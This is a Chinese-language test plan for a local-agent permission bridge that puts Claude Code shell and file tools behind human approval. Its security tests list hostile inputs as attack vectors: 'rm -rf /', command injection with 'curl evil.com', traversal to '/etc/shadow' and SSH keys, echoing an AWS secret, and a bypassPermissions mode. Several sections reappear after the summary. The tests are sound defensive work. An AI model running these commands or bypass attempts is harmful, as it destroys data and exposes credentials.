# V1-V6 本地 Agent 生产级测试用例

## 概述

本文档为 V1-V6 本地 Agent Claude Code 权限桥接功能提供完整的生产级测试用例，确保每个环节可靠、安全。

## 测试覆盖矩阵

| 测试类型 | 覆盖范围 | 优先级 |
|---------|---------|-------|
| 单元测试 | 权限验证、工具映射、状态转换 | P0 |
| 集成测试 | API 端点、数据库持久化、事件流 | P0 |
| 端到端测试 | 完整工作流、用户场景 | P0 |
| 安全测试 | 权限绕过、数据泄露、注入攻击 | P0 |
| 性能测试 | 并发处理、响应时间 | P1 |
| 兼容性测试 | 向后兼容、版本升级 | P1 |

## 一、单元测试 (Unit Tests)

### 1.1 权限验证测试

#### Test: `test_v6_capability_gate_requires_explicit_bridge`
**目的**: 验证 V6 权限桥接需要显式启用
**前置条件**: 
- V5 Claude Code 连接存在
- 无 `claude_permission_bridge_v1` 能力

**测试步骤**:
1. 尝试创建本地工具请求
2. 验证返回 409 错误
3. 检查 `host_tools_authorized=false`

**预期结果**:
- 请求被拒绝
- 错误信息明确说明需要权限桥接能力

**实际验证**:
```python
assert response.status_code == 409
assert "permission bridge not enabled" in response.json()["detail"]
```

#### Test: `test_v6_capability_normalization`
**目的**: 验证 V6 能力字段正确规范化

**测试步骤**:
1. 注册 Claude Code V6 连接
2. 获取连接能力
3. 验证所有规范化字段

**预期结果**: 包含正确的 V6 执行模式和权限桥接配置

#### Test: `test_v5_no_self_upgrade`
**目的**: V5 连接不能通过心跳自升级到 V6

**测试步骤**:
1. 注册 V5 Claude Code 连接
2. 发送包含 V6 能力的心跳
3. 验证连接能力未更新

**预期结果**: V5 连接保持无工具状态

### 1.2 工具映射测试

#### Test: `test_claude_bash_maps_to_run_shell`
**目的**: Claude Code Bash 工具正确映射到 run_shell

**测试步骤**:
1. Claude SDK 请求 Bash 工具执行
2. 验证创建 LocalAgentToolRequest
3. 检查 tool_name 为 "run_shell"

**预期结果**: 
- 工具请求正确分类
- 命令参数完整保留

#### Test: `test_claude_write_maps_to_write_file`
**目的**: Claude Write 工具映射到 write_file

**测试步骤**:
1. Claude SDK 请求 Write 工具
2. 验证创建 pending change
3. 检查目标路径和内容哈希

**预期结果**: 
- 创建 LocalAgentPendingChange
- 路径和哈希正确记录

#### Test: `test_claude_edit_maps_to_apply_patch`
**目的**: Claude Edit/MultiEdit 映射到 apply_patch

**测试步骤**:
1. Claude SDK 请求 Edit 工具
2. 验证生成 diff 预览
3. 检查 pending change 类型

**预期结果**: 
- diff_sha256 正确计算
- 目标文件路径冻结

#### Test: `test_unknown_tool_denied`
**目的**: 未知工具被拒绝

**测试步骤**:
1. 请求未映射的工具
2. 验证返回 denied 决策

**预期结果**: 
- 不创建 ToolCall
- 返回明确拒绝原因

### 1.3 审批决策测试

#### Test: `test_approval_required_creates_pending_state`
**目的**: 需要审批的工具创建正确的待审状态

**测试步骤**:
1. 提交需要审批的工具请求
2. 验证创建 ToolApproval(PENDING)
3. 检查 Run 状态为 WAITING

**预期结果**:
- ToolCall 状态为 PENDING_APPROVAL
- ToolApproval 记录存在
- AgentEvent 顺序正确

#### Test: `test_approve_returns_modified_input`
**目的**: 修改后批准返回正确的输入

**测试步骤**:
1. 创建工具请求
2. 批准并修改参数
3. 验证 SDK 收到修改后的输入

**预期结果**:
- decision_json.modified = true
- 原始输入未被执行
- 修改后的输入可执行

#### Test: `test_deny_prevents_execution`
**目的**: 拒绝阻止工具执行

**测试步骤**:
1. 创建工具请求
2. 拒绝审批
3. 验证无副作用

**预期结果**:
- 返回 SDK deny
- 无 ToolCall(SUCCESS)
- 文件/命令未执行

#### Test: `test_expired_approval_fails_closed`
**目的**: 过期审批失败关闭

**测试步骤**:
1. 创建工具请求
2. 等待 TTL 过期
3. 验证终止状态

**预期结果**:
- 工具请求标记为 EXPIRED
- 无副作用发生
- 清理待审状态

#### Test: `test_revoke_terminates_pending_tools`
**目的**: 撤销连接终止所有待审工具

**测试步骤**:
1. 创建多个待审工具请求
2. 撤销连接
3. 验证所有待审状态终止

**预期结果**:
- 所有 ToolApproval 标记为 REVOKED
- 返回 SDK deny
- 无法继续执行

## 二、集成测试 (Integration Tests)

### 2.1 配对与注册测试

#### Test: `test_v6_pairing_with_sdk_scope`
**目的**: V6 配对需要正确的 scope

**测试步骤**:
1. 创建配对令牌，scope 包含 claude_code + sdk
2. 注册连接
3. 验证连接能力

**预期结果**:
- 配对成功
- 能力包含 permission_bridge

#### Test: `test_v6_pairing_without_sdk_fails`
**目的**: 缺少 SDK 时配对失败

**测试步骤**:
1. 模拟 SDK 不可用
2. 尝试 V6 配对
3. 验证失败且不消耗令牌

**预期结果**:
- 返回明确错误
- 配对令牌仍可用
- 无 LocalAgentConnection 创建

#### Test: `test_cross_org_token_rejected`
**目的**: 跨组织令牌被拒绝

**测试步骤**:
1. 使用组织 A 的令牌
2. 从组织 B 尝试注册
3. 验证拒绝

**预期结果**: 返回 403 错误

### 2.2 工具请求生命周期测试

#### Test: `test_tool_request_approval_execution_flow`
**目的**: 完整的工具请求-审批-执行流程

**测试步骤**:
1. 创建工具请求 (write_file)
2. 等待审批
3. 管理员批准
4. 执行并报告结果
5. 验证最终状态

**预期结果**:
- 每个阶段状态正确
- 事件顺序: request → approval → approved → result → success
- Run Detail 显示完整历史

#### Test: `test_pending_change_hash_validation`
**目的**: Pending change 哈希验证

**测试步骤**:
1. 创建 write 请求，生成 pending change
2. 批准
3. 执行时验证哈希
4. 尝试用不同内容提交结果

**预期结果**:
- 哈希不匹配返回 409
- 防止执行被篡改的内容

#### Test: `test_command_lifecycle_events`
**目的**: 命令生命周期事件完整性

**测试步骤**:
1. 批准 Bash 命令
2. 执行并收集输出
3. 命令完成
4. 验证所有事件

**预期结果**:
- LocalAgentCommand 创建
- 输出事件正确顺序
- 最终状态为 SUCCESS/FAILED

#### Test: `test_cancel_stops_execution`
**目的**: 取消停止正在执行的命令

**测试步骤**:
1. 开始长时间运行的命令
2. 发送取消请求
3. 验证命令终止

**预期结果**:
- cancel_requested_at 记录
- 命令状态变为 CANCELLED
- SDK 收到中断信号

#### Test: `test_retry_creates_new_request`
**目的**: 重试创建新的请求

**测试步骤**:
1. 执行失败的命令
2. 发起重试
3. 验证新请求创建

**预期结果**:
- 新 LocalAgentToolRequest 创建
- retry_of 字段指向原请求
- 重试计数更新

### 2.3 数据持久化测试

#### Test: `test_tool_approval_persists_correctly`
**目的**: 工具审批正确持久化

**测试步骤**:
1. 创建工具审批
2. 提交批准决策
3. 查询数据库
4. 验证所有字段

**预期结果**:
- ToolApproval 行存在
- 审批人、时间、决策正确
- frozen_metadata 完整

#### Test: `test_event_ordering_preserved`
**目的**: 事件顺序在数据库中保持

**测试步骤**:
1. 执行完整工具流程
2. 查询 AgentEvent
3. 验证 event_sequence

**预期结果**:
- 事件按时间顺序
- sequence 无间隙
- 类型正确

#### Test: `test_audit_trail_complete`
**目的**: 审计追踪完整

**测试步骤**:
1. 执行多个工具操作
2. 查询 AdminAuditEvent
3. 验证关键操作已记录

**预期结果**:
- 审批、拒绝、撤销都有记录
- 包含操作人和时间戳
- 敏感数据已脱敏

## 三、端到端测试 (E2E Tests)

### 3.1 场景：claude-approve-write

**目标**: 验证完整的写文件审批流程

**步骤**:
1. 启动 V6 Claude Code 连接
2. 用户发起写文件请求
3. 系统创建 pending change
4. 管理员审批
5. 执行写入
6. 验证文件内容

**验证点**:
- 文件实际创建
- 内容与批准的一致
- ToolCall 状态为 SUCCESS
- Run Detail 显示完整流程

**失败条件**:
- 文件未创建
- 内容不匹配
- 执行了未批准的操作

### 3.2 场景：claude-modified-approval

**目标**: 验证修改后批准的安全性

**步骤**:
1. Claude 请求写入 /etc/hosts
2. 系统识别为危险路径
3. 管理员修改为 /tmp/test.txt
4. 执行修改后的路径
5. 验证原路径未被修改

**验证点**:
- /etc/hosts 保持不变
- /tmp/test.txt 创建成功
- decision_json.modified = true
- 审计日志记录修改

**失败条件**:
- 原路径被修改
- 修改未被记录
- 两个路径都被写入

### 3.3 场景：claude-reject-bash

**目标**: 验证命令拒绝流程

**步骤**:
1. Claude 请求执行 rm -rf /
2. 系统分类为危险命令
3. 管理员拒绝
4. 验证命令未执行

**验证点**:
- 返回 SDK deny
- 无 LocalAgentCommand 创建
- Claude 收到拒绝消息
- 无副作用发生

### 3.4 场景：claude-revoke-pending

**目标**: 验证连接撤销清理待审状态

**步骤**:
1. 创建多个待审工具请求
2. 撤销 Claude Code 连接
3. 验证所有待审状态终止
4. 尝试继续执行（应失败）

**验证点**:
- 所有 ToolApproval 状态为 REVOKED
- 连接状态更新
- 无法继续轮询决策
- 清理完整

### 3.5 场景：claude-approval-timeout

**目标**: 验证审批超时处理

**步骤**:
1. 创建工具请求
2. 不进行审批，等待 TTL
3. 验证自动过期
4. 检查清理状态

**验证点**:
- ToolApproval 状态变为 EXPIRED
- SDK 收到超时通知
- 无副作用执行
- 可以重试

### 3.6 场景：claude-bypass-attempt

**目标**: 验证绕过防护机制

**步骤**:
1. 模拟恶意 SDK 尝试绕过
2. 在回调前执行副作用
3. 系统检测并阻止
4. 记录安全事件

**验证点**:
- 绕过被检测
- 协议违规记录
- 无 ToolCall(SUCCESS)
- 安全日志完整

### 3.7 场景：claude-api-failure-fail-closed

**目标**: 验证 API 失败时的失败关闭

**步骤**:
1. 模拟 API 端点失败
2. Claude 尝试工具请求
3. 验证拒绝执行
4. 检查错误处理

**验证点**:
- 返回 deny/abort
- 无副作用
- 错误消息清晰
- 可恢复状态

## 四、安全测试 (Security Tests)

### 4.1 权限绕过测试

#### Test: `test_sdk_allowed_tools_cannot_preapprove`
**目的**: SDK allowed_tools 不能预批准危险工具

**攻击向量**:
```python
allowed_tools = ["Bash", "Write", "Edit"]  # 尝试预批准
```

**验证**:
- 所有副作用工具仍需回调
- SDK 配置被忽略
- 每个请求都到 Harness

#### Test: `test_bypass_permissions_mode_blocked`
**目的**: bypassPermissions 模式被阻止

**攻击向量**:
```python
permission_mode = "bypassPermissions"
```

**验证**:
- 注册失败或能力拒绝
- 不能启用 host_tools_authorized

#### Test: `test_workspace_identity_enforced`
**目的**: 工作区身份强制验证

**攻击向量**:
- 修改本地 sidecar 中的 workspace_root
- 尝试访问未配对的路径

**验证**:
- 哈希不匹配拒绝执行
- 无法访问其他目录

### 4.2 数据泄露测试

#### Test: `test_no_credential_leak_in_events`
**目的**: 事件中不泄露凭证

**检查点**:
- AgentEvent 不含 device_token
- 不含原始 API key
- 不含完整 workspace_root
- 不含用户 HOME 路径

**验证**:
```python
for event in events:
    assert "device_token" not in str(event)
    assert "sk-ant-" not in str(event)
    assert "/Users/" not in str(event)
```

#### Test: `test_secret_redaction_in_output`
**目的**: 输出中脱敏秘密

**测试命令**:
```bash
echo $AWS_SECRET_ACCESS_KEY
```

**验证**:
- 输出被脱敏为 ***
- 原始值不出现在日志
- 审计记录标记为 contains_secret

#### Test: `test_file_permissions_enforced`
**目的**: 文件权限正确强制

**验证**: bridge.device-token 为 0600, session 目录为 0700

### 4.3 注入攻击测试

#### Test: `test_command_injection_prevention`
**目的**: 防止命令注入

**攻击向量**: `file.txt; rm -rf /`

**验证**: 参数正确转义，多命令被拒绝

#### Test: `test_path_traversal_blocked`
**目的**: 阻止路径遍历

**攻击向量**: `../../../etc/passwd`

**验证**: 请求被拒绝，分类为高风险

#### Test: `test_symlink_escape_prevented`
**目的**: 防止符号链接逃逸

**验证**: 符号链接被检测，跨边界访问被拒绝

### 4.4 权限提升测试

#### Test: `test_viewer_cannot_approve`
**目的**: Viewer 角色无法批准

**验证**: 返回 403，审批状态未改变

#### Test: `test_cross_org_approval_blocked`
**目的**: 跨组织批准被阻止

**验证**: 组织边界强制，无法批准其他组织的请求

## 五、性能测试 (Performance Tests)

### 5.1 并发处理测试

#### Test: `test_concurrent_tool_requests`
**目标**: 处理并发工具请求

**步骤**:
1. 同时发起 10 个工具请求
2. 监控响应时间
3. 验证所有请求正确处理

**性能指标**:
- 平均响应时间 < 500ms
- P95 < 1s
- 无请求丢失

#### Test: `test_approval_polling_efficiency`
**目标**: 轮询决策的效率

**步骤**:
1. 创建待审请求
2. 监控轮询频率
3. 批准后验证响应时间

**性能指标**:
- 轮询间隔合理 (1-5s)
- 批准后 < 2s 内收到
- 无过度轮询

### 5.2 资源消耗测试

#### Test: `test_memory_usage_bounded`
**目标**: 内存使用受控

**步骤**:
1. 运行长时间会话
2. 执行多个工具操作
3. 监控内存增长

**性能指标**:
- 无内存泄漏
- 稳态内存 < 500MB
- 旧事件正确清理

#### Test: `test_database_query_efficiency`
**目标**: 数据库查询优化

**步骤**:
1. 执行工具流程
2. 监控 SQL 查询
3. 验证无 N+1 问题

**性能指标**:
- 单流程 < 20 个查询
- 使用索引
- 无全表扫描

## 六、兼容性测试 (Compatibility Tests)

### 6.1 版本兼容测试

#### Test: `test_v5_connections_still_work`
**目的**: V5 连接继续工作

**步骤**:
1. 使用 V5 配对
2. 验证无工具功能
3. 确认不受 V6 影响

**预期结果**:
- V5 功能完整
- 无意外升级
- 行为一致

#### Test: `test_v6_to_v5_graceful_degradation`
**目的**: V6 降级到 V5 正常

**步骤**:
1. V6 连接遇到 SDK 问题
2. 回退到 V5 模式
3. 验证基本功能

**预期结果**:
- 自动回退
- 错误消息清晰
- 无数据损坏

### 6.2 客户端兼容测试

#### Test: `test_old_bridge_client_compatibility`
**目的**: 旧 bridge 客户端兼容

**步骤**:
1. 使用旧版本 hao CLI
2. 尝试连接
3. 验证拒绝或降级

**预期结果**:
- 明确版本不匹配错误
- 提示升级
- 无崩溃

## 七、UI 测试 (Frontend Tests)

### 7.1 Agent Studio 测试

#### Test: `test_v6_badge_display`
**目的**: V6 标识正确显示

**验证点**:
- 默认 Agent Studio 接入向导生成一条通用命令，命令不包含 `--adapter`
- 默认 scope 包含 `hao`、`codex`、`claude_code`，执行命令后再在第三步选择并命名识别到的 Agent
- 默认通用命令发现的 Claude Code 显示为 V5，并显示 "本地工具禁用"
- 默认通用接入不显示 "V6 权限桥" 或 "本地工具需审批"
- 显式 Claude Code V6 高级配对命令仍包含 `--permission-bridge sdk`
- 撤销已发现连接后，该连接立即从向导选择列表和保存 PATCH 集合中移除
- `fake` 连接不计入默认用户可见本地 Agent 就绪数量

#### Test: `test_connection_status_update`
**目的**: 连接状态实时更新

**步骤**:
1. 创建 V6 连接
2. 撤销连接
3. 验证 UI 更新

**预期**: 状态正确反映，无需刷新

### 7.2 Workspace 测试

#### Test: `test_pending_approval_indicator`
**目的**: 待审批指示器显示

**步骤**:
1. 发起工具请求
2. 验证 UI 显示等待状态
3. 显示审批链接

**预期**: 用户能看到待审状态和操作入口

#### Test: `test_offline_state_handled`
**目的**: 离线状态正确处理

**步骤**:
1. 断开连接
2. 验证 UI 显示离线
3. 历史消息仍可读

**预期**: 优雅降级，无白屏

### 7.3 Run Detail 测试

#### Test: `test_approval_card_complete`
**目的**: 审批卡片信息完整

**验证点**:
- 显示工具名称
- 显示风险级别
- 显示待审参数
- 审批/拒绝按钮可用

#### Test: `test_event_stream_ordered`
**目的**: 事件流正确排序

**验证**: 事件按时间顺序显示，类型正确标识

## 八、回归测试 (Regression Tests)

### 8.1 V1-V5 功能回归

#### Test: `test_v1_pairing_still_works`
**目的**: V1 基础配对未破坏
**验证**: 通用命令可自动接入 `hao`；显式测试 scope 仍可接入 `fake`

#### Test: `test_v3_tool_approval_unchanged`
**目的**: V3 工具审批逻辑未改变
**验证**: 非 Claude 工具请求流程一致

#### Test: `test_v4_codex_unaffected`
**目的**: V4 Codex 适配器不受影响
**验证**: Codex 连接和行为正常

#### Test: `test_v5_claude_no_tools_preserved`
**目的**: V5 Claude 无工具模式保留
**验证**: V5 连接仍然拒绝工具请求

## 九、测试执行指南

### 9.1 运行所有测试

```bash
# 后端单元测试
cd services/api-server
.venv/bin/python -m pytest tests/test_local_agents.py -v

# 后端集成测试
.venv/bin/python -m pytest tests/test_local_agents.py tests/test_tool_approvals.py -v

# CLI 测试
.venv/bin/python -m pytest tests/test_hao_cli.py tests/test_hao_cli_v2.py -v

# 前端测试
cd apps/agent-console
npm test -- AgentListPage.studio.test.tsx AgentWorkspacePage.team-launch.test.tsx

# E2E Smoke 测试
python3 scripts/smoke-test-local-agent-v6.py --scenario claude-approve-write
python3 scripts/smoke-test-local-agent-v6.py --scenario claude-modified-approval
python3 scripts/smoke-test-local-agent-v6.py --scenario claude-reject-bash
python3 scripts/smoke-test-local-agent-v6.py --scenario claude-revoke-pending
python3 scripts/smoke-test-local-agent-v6.py --scenario claude-approval-timeout
python3 scripts/smoke-test-local-agent-v6.py --scenario claude-bypass-attempt
python3 scripts/smoke-test-local-agent-v6.py --scenario claude-api-failure-fail-closed
```

### 9.2 测试优先级

**P0 - 必须通过 (阻塞发布)**:
- 权限验证测试
- 工具映射测试
- 审批决策测试
- 所有安全测试
- V6 端到端场景

**P1 - 应该通过**:
- 性能测试
- 兼容性测试
- UI 测试

**P2 - 可选**:
- 极端边界情况
- 性能优化验证

### 9.3 失败处理

**测试失败时的检查清单**:
1. 查看详细错误日志
2. 检查数据库状态
3. 验证 API 响应
4. 检查审计日志
5. 确认环境配置

**常见问题排查**:
- SDK 未安装: 检查 claude_agent_sdk 包
- 权限错误: 验证文件权限 (0600/0700)
- 超时: 增加 TTL 或检查轮询逻辑
- 数据不一致: 清理测试数据库

## 十、测试覆盖率要求

### 10.1 代码覆盖率目标

| 模块 | 目标覆盖率 |
|------|----------|
| 权限验证 (agent_local.py) | 95% |
| 工具映射 (tool mapping) | 90% |
| 审批逻辑 (tool_approvals.py) | 95% |
| CLI bridge (hao/main.py) | 85% |
| 前端组件 (AgentListPage) | 80% |

### 10.2 场景覆盖清单

- [x] V6 启用和注册
- [x] V5 连接保持无工具
- [x] 工具请求创建
- [x] 审批流程 (批准/拒绝/修改)
- [x] 执行和结果报告
- [x] 取消和重试
- [x] 超时和过期
- [x] 连接撤销
- [x] 权限绕过防护
- [x] 数据泄露防护
- [x] 注入攻击防护
- [x] 并发处理
- [x] 版本兼容性

## 十一、测试数据管理

### 11.1 测试数据准备

**配对令牌**:
```python
def create_test_pairing_token(agent_id="default", scope=None):
    return client.post(
        "/api/agents/local-agent/pairing-tokens",
        headers=AUTH_HEADERS,
        json={
            "agent_id": agent_id,
            "scope": scope or {"executable": True}
        }
    )
```

**V6 连接**:
```python
def create_v6_connection(capabilities=None):
    capabilities = capabilities or _claude_v6_capabilities()
    return client.post(
        "/api/agents/local-agent/connections/register",
        json={
            "pair_token": token,
            "pair_code": code,
            "adapter_kind": "claude_code",
            "capabilities": capabilities
        }
    )
```

### 11.2 测试数据清理

```python
def cleanup_test_data(db_session):
    # 删除测试创建的记录
    db_session.query(LocalAgentConnection).filter(...).delete()
    db_session.query(LocalAgentToolRequest).filter(...).delete()
    db_session.query(ToolApproval).filter(...).delete()
    db_session.commit()
```

## 十二、持续集成

### 12.1 CI 流水线集成

```yaml
# .github/workflows/test-local-agent.yml
name: Local Agent Tests
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run backend tests
        run: |
          cd services/api-server
          pytest tests/test_local_agents.py -v
      
      - name: Run smoke tests
        run: |
          python3 scripts/smoke-test-local-agent-v6.py --all
```

### 12.2 质量门禁

**合并要求**:
- 所有 P0 测试通过
- 代码覆盖率 >= 85%
- 无 P0/P1 安全问题
- 文档更新完成

## 总结

本测试套件覆盖 V1-V6 本地 Agent 功能的所有关键环节：

✅ **权限和安全**: 验证权限桥接、审批流程、安全防护
✅ **功能完整性**: 覆盖配对、工具映射、执行、状态管理
✅ **用户体验**: UI 测试确保可用性
✅ **稳定性**: 性能和兼容性测试保证质量
✅ **可追溯性**: 审计和日志验证合规

执行此测试套件可确保 V1-V6 功能在生产环境中安全、可靠运行。

#### Test: `test_file_permissions_enforced`
**目的**: 文件权限正确强制

**检查点**:
- bridge.device-token 为 0600
- workspace-root sidecar 为 0600
- session 目录为 0700

**验证**:
```python
assert stat.S_IMODE(os.stat(device_token_file).st_mode) == 0o600
```

### 4.3 注入攻击测试

#### Test: `test_command_injection_prevention`
**目的**: 防止命令注入

**攻击向量**:
```bash
file.txt; rm -rf /
file.txt && curl evil.com
```

**验证**:
- 参数正确转义
- 多个命令被拒绝或隔离
- 无非预期命令执行

#### Test: `test_path_traversal_blocked`
**目的**: 阻止路径遍历

**攻击向量**:
```
../../../etc/passwd
/etc/shadow
../../.ssh/id_rsa
```

**验证**:
- 请求被拒绝
- 分类为高风险
- 路径规范化正确

#### Test: `test_symlink_escape_prevented`
**目的**: 防止符号链接逃逸

**攻击步骤**:
1. 创建指向敏感位置的符号链接
2. 尝试通过链接访问
3. 验证检测和阻止

**验证**:
- 符号链接被检测
- 真实目标路径检查
- 跨边界访问被拒绝

### 4.4 权限提升测试

#### Test: `test_viewer_cannot_approve`
**目的**: Viewer 角色无法批准

**测试步骤**:
1. 使用 viewer 令牌
2. 尝试批准工具请求
3. 验证 403 错误

**验证**:
- 返回权限不足
- 审批状态未改变
- 审计记录尝试

#### Test: `test_v6_capability_normalization`
**目的**: 验证 V6 能力字段正确规范化
**前置条件**: 
- 报告 `claude_permission_bridge_v1=true`

**测试步骤**:
1. 注册 Claude Code V6 连接
2. 获取连接能力
3. 验证所有规范化字段

**预期结果**:
```json
{
  "adapter_kind": "claude_code",
  "execution_mode": "agent_sdk_intent_capture_harness_executor",
  "permission_bridge": "harness_local_tool_request_v1",
  "permission_bridge_execution": "harness_owned_executor",
  "sdk_native_tool_execution_enabled": false,
  "host_tools_authorized": true,
  "supports_resume": false,
  "supports_cancel": true
}
```

#### Test: `test_v5_connection_cannot_upgrade_via_heartbeat`
**目的**: 验证 V5 连接不能自升级到 V6
**前置条件**: 
- V5 Claude Code 连接已注册

**测试步骤**:
1. 发送包含 V6 能力的心跳
2. 验证连接能力未更新
3. 确认 `host_tools_authorized` 仍为 false

**预期结果**:
- V5 连接保持无工具状态
- 心跳被接受但能力不升级
